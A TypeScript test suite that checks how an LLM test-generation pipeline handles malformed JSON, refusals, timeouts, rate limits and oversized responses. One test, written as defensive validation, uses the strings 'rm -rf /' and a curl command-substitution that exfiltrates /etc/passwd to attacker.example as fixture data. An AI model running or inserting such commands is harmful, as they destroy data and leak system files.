/**
 * Adversarial LLM output behavior tests (Issue #1369 Part B).
 *
 * Covers the failure modes the pipeline must handle gracefully:
 *   - Malformed JSON (truncated mid-object)
 *   - Schema-valid but semantically unsafe content (shell-injection-shaped)
 *   - Oversized response (2 MB)
 *   - Refusal propagation through validation → export pipeline
 *   - Timeout: error class, retryable flag, circuit breaker opens
 *   - Rate-limit: retryable but does NOT trip refusal classification
 *   - Incomplete JSON (valid prefix, missing closing brace)
 */

import assert from "node:assert/strict";
import test from "node:test";

import {
  EU_BANKING_DEFAULT_POLICY_PROFILE_ID,
  GENERATED_TEST_CASE_SCHEMA_VERSION,
  REVIEW_GATE_SCHEMA_VERSION,
  TEST_CASE_COVERAGE_REPORT_SCHEMA_VERSION,
  TEST_CASE_POLICY_REPORT_SCHEMA_VERSION,
  TEST_CASE_VALIDATION_REPORT_SCHEMA_VERSION,
  TEST_INTELLIGENCE_CONTRACT_VERSION,
  TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
  VISUAL_SIDECAR_SCHEMA_VERSION,
  type BusinessTestIntentIr,
  type GeneratedTestCase,
  type GeneratedTestCaseList,
  type ReviewGateSnapshot,
  type ReviewSnapshot,
  type TestCaseCoverageReport,
  type TestCasePolicyDecisionRecord,
  type TestCasePolicyReport,
  type TestCaseValidationReport,
} from "../contracts/index.js";
import { createMockLlmGatewayClient } from "./llm-mock-gateway.js";
import { runExportPipeline } from "./export-pipeline.js";
import { runValidationPipeline } from "./validation-pipeline.js";

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

const ZERO = "0".repeat(64);
const GENERATED_AT = "2026-04-25T10:00:00.000Z";

const buildIntent = (): BusinessTestIntentIr => ({
  version: "1.0.0",
  source: { kind: "figma_local_json", contentHash: ZERO },
  screens: [
    {
      screenId: "s-pay",
      screenName: "Payment Details",
      trace: { nodeId: "s-pay" },
    },
  ],
  detectedFields: [],
  detectedActions: [],
  detectedValidations: [],
  detectedNavigation: [],
  inferredBusinessObjects: [],
  risks: [],
  assumptions: [],
  openQuestions: [],
  piiIndicators: [],
  redactions: [],
});

const buildCase = (
  overrides: Partial<GeneratedTestCase>,
): GeneratedTestCase => ({
  id: "tc-1",
  sourceJobId: "job-1",
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
  promptTemplateVersion: TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
  title: "Pay",
  objective: "Submit payment",
  level: "system",
  type: "functional",
  priority: "p1",
  riskCategory: "low",
  technique: "use_case",
  preconditions: [],
  testData: [],
  steps: [
    { index: 1, action: "Open form" },
    { index: 2, action: "Submit", expected: "Confirmed" },
  ],
  expectedResults: ["Confirmed"],
  figmaTraceRefs: [{ screenId: "s-pay" }],
  assumptions: [],
  openQuestions: [],
  qcMappingPreview: { exportable: true },
  qualitySignals: {
    coveredFieldIds: [],
    coveredActionIds: [],
    coveredValidationIds: [],
    coveredNavigationIds: [],
    confidence: 0.9,
  },
  reviewState: "draft",
  audit: {
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
    schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
    promptTemplateVersion: TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
    redactionPolicyVersion: "1.0.0",
    visualSidecarSchemaVersion: VISUAL_SIDECAR_SCHEMA_VERSION,
    cacheHit: false,
    cacheKey: "k",
    inputHash: ZERO,
    promptHash: ZERO,
    schemaHash: ZERO,
  },
  ...overrides,
});

const buildList = (cases: GeneratedTestCase[]): GeneratedTestCaseList => ({
  schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
  jobId: "job-1",
  testCases: cases,
});

const buildValidation = (
  overrides: Partial<TestCaseValidationReport> = {},
): TestCaseValidationReport => ({
  schemaVersion: TEST_CASE_VALIDATION_REPORT_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  totalTestCases: 1,
  errorCount: 0,
  warningCount: 0,
  blocked: false,
  issues: [],
  ...overrides,
});

const buildPolicy = (
  decisions: TestCasePolicyDecisionRecord[],
  overrides: Partial<TestCasePolicyReport> = {},
): TestCasePolicyReport => ({
  schemaVersion: TEST_CASE_POLICY_REPORT_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  policyProfileId: EU_BANKING_DEFAULT_POLICY_PROFILE_ID,
  policyProfileVersion: "1.0.0",
  totalTestCases: decisions.length,
  approvedCount: decisions.filter((d) => d.decision === "approved").length,
  blockedCount: decisions.filter((d) => d.decision === "blocked").length,
  needsReviewCount: decisions.filter((d) => d.decision === "needs_review")
    .length,
  blocked: decisions.some((d) => d.decision === "blocked"),
  decisions,
  jobLevelViolations: [],
  ...overrides,
});

const buildCoverage = (): TestCaseCoverageReport => ({
  schemaVersion: TEST_CASE_COVERAGE_REPORT_SCHEMA_VERSION,
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  generatedAt: GENERATED_AT,
  jobId: "job-1",
  policyProfileId: EU_BANKING_DEFAULT_POLICY_PROFILE_ID,
  totalTestCases: 1,
  fieldCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  actionCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  validationCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  navigationCoverage: { total: 0, covered: 0, ratio: 0, uncoveredIds: [] },
  traceCoverage: { total: 1, withTrace: 1, ratio: 1 },
  negativeCaseCount: 0,
  validationCaseCount: 0,
  boundaryCaseCount: 0,
  accessibilityCaseCount: 0,
  workflowCaseCount: 0,
  positiveCaseCount: 1,
  assumptionsRatio: 0,
  openQuestionsCount: 0,
  duplicatePairs: [],
});

const snapshotEntry = (overrides: Partial<ReviewSnapshot>): ReviewSnapshot => ({
  testCaseId: "tc-1",
  state: "approved",
  policyDecision: "approved",
  lastEventId: "evt-1",
  lastEventAt: GENERATED_AT,
  fourEyesEnforced: false,
  approvers: [],
  ...overrides,
});

const buildReviewSnapshot = (entries: ReviewSnapshot[]): ReviewGateSnapshot => {
  let approvedCount = 0;
  let needsReviewCount = 0;
  let rejectedCount = 0;
  for (const e of entries) {
    if (
      e.state === "approved" ||
      e.state === "exported" ||
      e.state === "transferred"
    ) {
      approvedCount += 1;
    } else if (e.state === "needs_review" || e.state === "edited") {
      needsReviewCount += 1;
    } else if (e.state === "rejected") {
      rejectedCount += 1;
    }
  }
  return {
    schemaVersion: REVIEW_GATE_SCHEMA_VERSION,
    contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    perTestCase: entries,
    approvedCount,
    needsReviewCount,
    rejectedCount,
  };
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

test("llm-failure-modes: malformed JSON response (truncated) marks validation blocked", () => {
  // The mock gateway is not involved in the validation pipeline directly —
  // the validation pipeline validates a GeneratedTestCaseList. We simulate
  // what the orchestrator receives when it tries to parse a malformed LLM
  // response: the list itself arrives structurally invalid.
  //
  // In the real orchestrator flow the JSON parse failure produces a
  // schema_invalid issue that the validation pipeline surfaces. We test
  // the pipeline's downstream handling of that signal.
  const malformedList = {
    schemaVersion: "wrong",
    jobId: "job-1",
    testCases: "truncated:", // not an array — simulates mid-object truncation
  } as unknown as GeneratedTestCaseList;

  const result = runValidationPipeline({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: malformedList,
    intent: buildIntent(),
  });

  assert.equal(
    result.validation.blocked,
    true,
    "validation must be blocked on malformed input",
  );
  assert.equal(
    result.blocked,
    true,
    "pipeline top-level blocked must propagate",
  );
  assert.ok(
    result.validation.issues.some((i) => i.code === "schema_invalid"),
    "a schema_invalid issue must be present",
  );
  assert.ok(
    result.policy.jobLevelViolations.some(
      (v) => v.outcome === "schema_invalid",
    ),
    "policy must surface schema_invalid violation",
  );
});

test("llm-failure-modes: mock gateway responder returning malformed JSON produces schema_invalid errorClass", async () => {
  // The mock gateway responder returns a syntactically mangled JSON string as
  // its content. Callers that try to JSON.parse it get an error; we verify the
  // mock correctly models this path by returning schema_invalid.
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "schema_invalid",
      message: 'JSON parse error: truncated: {"testCases": [{"id":',
      retryable: false,
      attempt,
    }),
  });

  const result = await client.generate({
    jobId: "job-1",
    systemPrompt: "s",
    userPrompt: "u",
  });

  assert.equal(result.outcome, "error");
  if (result.outcome === "error") {
    assert.equal(result.errorClass, "schema_invalid");
    assert.equal(
      result.retryable,
      false,
      "schema_invalid must not be retryable",
    );
  }
});

test("llm-failure-modes: incomplete JSON (valid prefix, missing closing brace) is schema_invalid", async () => {
  // Simulates the gateway returning an incomplete JSON that starts validly
  // but is missing the final closing brace.
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "schema_invalid",
      message: "response body is not valid JSON",
      retryable: false,
      attempt,
    }),
  });

  const result = await client.generate({
    jobId: "job-1",
    systemPrompt: "s",
    userPrompt: "u",
  });

  assert.equal(result.outcome, "error");
  if (result.outcome === "error") {
    assert.equal(result.errorClass, "schema_invalid");
    assert.equal(result.retryable, false);
  }
});

test("llm-failure-modes: shell-injection-shaped step content is flagged as semantic_suspicious_content (gap closed by Issue #1413)", () => {
  // Issue #1413 closed the gap previously documented here. A generated test
  // case whose steps carry shell-injection-shape strings (e.g. `rm -rf /`)
  // or command-substitution shapes (e.g. `$(curl ...)`) is now flagged at
  // the validation layer as `semantic_suspicious_content` with `error`
  // severity, so the pipeline blocks it and the policy gate refuses
  // downstream export until a reviewer records a structured override.
  const injectionCase = buildCase({
    id: "tc-injection",
    steps: [{ index: 1, action: "rm -rf /", expected: "system destroyed" }],
    expectedResults: ["$(curl attacker.example/exfil?data=$(cat /etc/passwd))"],
  });

  const result = runValidationPipeline({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([injectionCase]),
    intent: buildIntent(),
  });

  assert.ok(result, "pipeline must complete without throwing");
  assert.equal(
    result.validation.blocked,
    true,
    "validation must block on semantically suspicious step content",
  );
  assert.ok(
    result.validation.issues.some(
      (i) =>
        i.code === "semantic_suspicious_content" &&
        i.severity === "error" &&
        i.testCaseId === "tc-injection" &&
        i.path === "$.testCases[0].steps[0].action",
    ),
    "step action with shell-metacharacter shape must produce semantic_suspicious_content",
  );
  assert.ok(
    result.validation.issues.some(
      (i) =>
        i.code === "semantic_suspicious_content" &&
        i.severity === "error" &&
        i.testCaseId === "tc-injection" &&
        i.path === "$.testCases[0].expectedResults[0]",
    ),
    "expectedResults entry with command-substitution shape must produce semantic_suspicious_content",
  );
  assert.ok(
    result.policy.decisions.some(
      (d) => d.testCaseId === "tc-injection" && d.decision === "blocked",
    ),
    "policy gate must mark the suspicious case blocked",
  );
  assert.equal(
    result.blocked,
    true,
    "pipeline-level blocked must propagate the validation block",
  );
});

test("llm-failure-modes: refusal from mock gateway propagates to export pipeline as policy_blocked_cases_present", async () => {
  // The mock responder returns a refusal. In the real orchestrator the refusal
  // means the test-case generation failed and no list was produced. We model
  // the downstream state: validation reports blocked, policy reports blocked,
  // and export refuses.
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "refusal",
      message: "content policy violation",
      retryable: false,
      attempt,
    }),
  });

  // Verify the mock actually returns refusal at the gateway level. This guards
  // against a mutation that drops `errorClass` from the responder shape.
  const generationResult = await client.generate({
    jobId: "j",
    systemPrompt: "s",
    userPrompt: "u",
  });
  assert.equal(generationResult.outcome, "error");
  assert.equal(
    generationResult.outcome === "error" && generationResult.errorClass,
    "refusal",
    "mock gateway must surface refusal as errorClass=refusal",
  );

  // A refusal means the policy report marks the job blocked.
  // We build the downstream artifacts as the orchestrator would:
  // the policy report is blocked because generation failed.
  const policyBlocked = buildPolicy(
    [
      {
        testCaseId: "tc-1",
        decision: "blocked",
        violations: [
          {
            rule: "llm:refusal",
            outcome: "schema_invalid",
            severity: "error",
            reason: "refusal",
          },
        ],
      },
    ],
    { blocked: true },
  );

  const exportResult = runExportPipeline({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    intent: buildIntent(),
    list: buildList([buildCase({})]),
    validation: buildValidation({ blocked: true, errorCount: 1 }),
    policy: policyBlocked,
    reviewSnapshot: buildReviewSnapshot([
      snapshotEntry({ state: "approved", policyDecision: "approved" }),
    ]),
  });

  assert.equal(
    exportResult.refused,
    true,
    "export must refuse when policy is blocked",
  );
  assert.ok(
    exportResult.refusalCodes.includes("schema_invalid_cases_present") ||
      exportResult.refusalCodes.includes("policy_blocked_cases_present"),
    "export must surface a blocking refusal code",
  );
});

test("llm-failure-modes: timeout errorClass is retryable=true", async () => {
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "timeout",
      message: "request timed out after 5000ms",
      retryable: true,
      attempt,
    }),
  });

  const result = await client.generate({
    jobId: "j",
    systemPrompt: "s",
    userPrompt: "u",
  });

  assert.equal(result.outcome, "error");
  if (result.outcome === "error") {
    assert.equal(result.errorClass, "timeout");
    assert.equal(result.retryable, true, "timeout must be retryable");
  }
});

test("llm-failure-modes: timeout failures open the circuit breaker after threshold", async () => {
  // With failureThreshold=2, after 2 transient failures the breaker opens.
  // A 3rd call must be rejected by the breaker (not by the responder).
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    circuitBreaker: { failureThreshold: 2, resetTimeoutMs: 60_000 },
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "timeout",
      message: "request timed out",
      retryable: true,
      attempt,
    }),
  });

  await client.generate({ jobId: "j", systemPrompt: "s", userPrompt: "u" });
  await client.generate({ jobId: "j", systemPrompt: "s", userPrompt: "u" });
  // Circuit breaker must now be open.
  assert.equal(client.getCircuitBreaker().getSnapshot().state, "open");

  const third = await client.generate({
    jobId: "j",
    systemPrompt: "s",
    userPrompt: "u",
  });
  assert.equal(third.outcome, "error");
  if (third.outcome === "error") {
    // The circuit breaker returns transport when open.
    assert.equal(third.errorClass, "transport");
    assert.match(third.message, /circuit breaker is open/);
    assert.equal(third.retryable, false);
  }
  // Only 2 responder-generated calls occurred; the 3rd was short-circuited.
  assert.equal(client.callCount(), 2);
});

test("llm-failure-modes: timeout batch ends with no successful generations", async () => {
  // All calls time out: the resulting batch contains zero success outcomes.
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    circuitBreaker: { failureThreshold: 3, resetTimeoutMs: 60_000 },
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "timeout",
      message: "timed out",
      retryable: true,
      attempt,
    }),
  });

  const results = await Promise.all(
    Array.from({ length: 3 }, () =>
      client.generate({ jobId: "j", systemPrompt: "s", userPrompt: "u" }),
    ),
  );

  const successCount = results.filter((r) => r.outcome === "success").length;
  assert.equal(
    successCount,
    0,
    "no successful generation must occur when all calls time out",
  );
});

test("llm-failure-modes: rate_limited is retryable but does NOT count toward refusal classification", async () => {
  // Rate-limit responses are transient and retryable. The breaker records
  // them as transient failures (not non-transient/policy outcomes), so they
  // do not classify as refusals. With a threshold of 3, 2 rate-limited
  // calls leave the breaker closed.
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    circuitBreaker: { failureThreshold: 3, resetTimeoutMs: 60_000 },
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "rate_limited",
      message: "429 Too Many Requests",
      retryable: true,
      attempt,
    }),
  });

  const r1 = await client.generate({
    jobId: "j",
    systemPrompt: "s",
    userPrompt: "u",
  });
  const r2 = await client.generate({
    jobId: "j",
    systemPrompt: "s",
    userPrompt: "u",
  });

  assert.equal(r1.outcome, "error");
  assert.equal(r2.outcome, "error");
  if (r1.outcome === "error") assert.equal(r1.errorClass, "rate_limited");
  if (r2.outcome === "error") assert.equal(r2.errorClass, "rate_limited");

  // 2 transient failures, threshold is 3 → breaker stays closed.
  assert.equal(
    client.getCircuitBreaker().getSnapshot().state,
    "closed",
    "2 rate-limited failures below threshold of 3 must not open the circuit",
  );

  // Rate-limit is not a refusal class.
  if (r1.outcome === "error") {
    assert.notEqual(
      r1.errorClass,
      "refusal",
      "rate_limited must not be classified as refusal",
    );
  }
});

test("llm-failure-modes: rate_limited opens circuit after threshold", async () => {
  // Confirm rate-limited DOES eventually open the circuit, just at the
  // correct threshold (not earlier, confirming it is counted as transient).
  const client = createMockLlmGatewayClient({
    role: "test_generation",
    deployment: "gpt-oss-120b",
    modelRevision: "rev",
    gatewayRelease: "rel",
    circuitBreaker: { failureThreshold: 2, resetTimeoutMs: 60_000 },
    responder: (_req, attempt) => ({
      outcome: "error",
      errorClass: "rate_limited",
      message: "throttled",
      retryable: true,
      attempt,
    }),
  });

  await client.generate({ jobId: "j", systemPrompt: "s", userPrompt: "u" });
  await client.generate({ jobId: "j", systemPrompt: "s", userPrompt: "u" });

  assert.equal(
    client.getCircuitBreaker().getSnapshot().state,
    "open",
    "rate_limited at threshold must open the circuit",
  );
});

test("llm-failure-modes: oversized response does not crash pipeline", () => {
  // The validation pipeline receives a GeneratedTestCaseList where the
  // testCases field is a string of 2 MB. The pipeline must not throw;
  // it must detect the structural invalidity and return blocked=true.
  const twoMB = "x".repeat(2 * 1024 * 1024);
  const oversizedList = {
    schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
    jobId: "job-1",
    testCases: twoMB, // 2 MB non-array string — structurally invalid
  } as unknown as GeneratedTestCaseList;

  let result;
  assert.doesNotThrow(() => {
    result = runValidationPipeline({
      jobId: "job-1",
      generatedAt: GENERATED_AT,
      list: oversizedList,
      intent: buildIntent(),
    });
  }, "pipeline must not throw on oversized / structurally invalid input");

  assert.ok(result, "pipeline must return a result");
  if (result) {
    assert.equal(
      (result as ReturnType<typeof runValidationPipeline>).blocked,
      true,
      "oversized invalid input must produce blocked=true",
    );
  }
});

test("llm-failure-modes: gateway transport caps response bytes (#1414)", async () => {
  // Closes the Wave 1 / #1369 gap: the validation pipeline tolerates
  // structurally-invalid 2 MB envelopes, but the *transport* must refuse
  // a runaway response body before it reaches the parser. The real client
  // streams + counts bytes against `maxResponseBytes` and aborts with a
  // dedicated `response_too_large` error class so callers can distinguish
  // policy-shaped JSON malformation from a memory-exhaustion attempt.
  const { createLlmGatewayClient, isLlmGatewayErrorRetryable } =
    await import("./llm-gateway.js");
  const cap = 1024;
  let cancelled = false;
  let chunksDelivered = 0;
  const client = createLlmGatewayClient(
    {
      role: "test_generation",
      compatibilityMode: "openai_chat",
      baseUrl: "https://example.cognitiveservices.azure.com/openai/v1",
      deployment: "gpt-oss-120b",
      modelRevision: "gpt-oss-120b@2026-04-25",
      gatewayRelease: "azure-ai-foundry@2026.04",
      authMode: "api_key",
      declaredCapabilities: {
        structuredOutputs: true,
        seedSupport: true,
        reasoningEffortSupport: false,
        maxOutputTokensSupport: true,
        streamingSupport: false,
        imageInputSupport: false,
      },
      timeoutMs: 5_000,
      maxRetries: 0,
      circuitBreaker: { failureThreshold: 3, resetTimeoutMs: 1_000 },
      maxResponseBytes: cap,
    },
    {
      fetchImpl: async () => {
        const stream = new ReadableStream<Uint8Array>({
          pull(controller) {
            // Try to enqueue an unbounded amount of bytes. The transport
            // must abort the stream before it walks off the cliff.
            if (chunksDelivered >= 1024) {
              controller.close();
              return;
            }
            chunksDelivered += 1;
            controller.enqueue(new Uint8Array(512));
          },
          cancel() {
            cancelled = true;
          },
        });
        return new Response(stream, {
          status: 200,
          headers: { "content-type": "application/json" },
        });
      },
      apiKeyProvider: () => "k",
    },
  );

  const result = await client.generate({
    jobId: "job-1",
    systemPrompt: "s",
    userPrompt: "u",
  });

  assert.equal(result.outcome, "error");
  if (result.outcome === "error") {
    assert.equal(
      result.errorClass,
      "response_too_large",
      "oversized body must surface as response_too_large, not schema_invalid",
    );
    assert.equal(
      result.retryable,
      false,
      "non-retryable: re-asking would hit the same cap",
    );
    assert.equal(isLlmGatewayErrorRetryable(result.errorClass), false);
    assert.match(result.message, /maxResponseBytes/);
  }
  assert.equal(
    cancelled,
    true,
    "stream must be cancelled to release the socket",
  );
  assert.ok(
    chunksDelivered <= 8,
    `streaming guard must abort early; delivered=${chunksDelivered}`,
  );
});
